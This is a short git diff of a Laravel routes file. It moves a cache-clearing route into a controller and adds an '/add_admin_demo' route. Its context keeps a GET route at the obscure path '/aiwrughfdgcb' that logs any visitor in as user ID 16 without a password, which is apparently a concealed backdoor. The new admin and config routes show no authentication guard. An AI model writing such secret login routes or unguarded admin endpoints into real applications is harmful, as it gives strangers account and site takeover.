@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Controllers\ConfigController;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use App\Providers\RouteServiceProvider;
@@ -74,15 +75,9 @@ Route::get('/aiwrughfdgcb', function() {
     Auth::loginUsingId(16);
 });
 
-Route::get('/config_optimize', function() {
+Route::get('/config_optimize', [ConfigController::class, 'config_optimize'])->name('config_optimize');
+Route::get('/add_admin_demo', [ConfigController::class, 'add_admin_demo'])->name('add_admin_demo');
 
-    Artisan::call('route:cache');
-    Artisan::call('config:cache');
-    Artisan::call('cache:clear');
-    Artisan::call('view:clear');
-    Artisan::call('optimize:clear');
-    // exec('composer dump-autoload');
-});
 
 Route::get('install', 'InstallController@index')->name('install');
 Route::post('installl', 'InstallController@install')->name('installl');
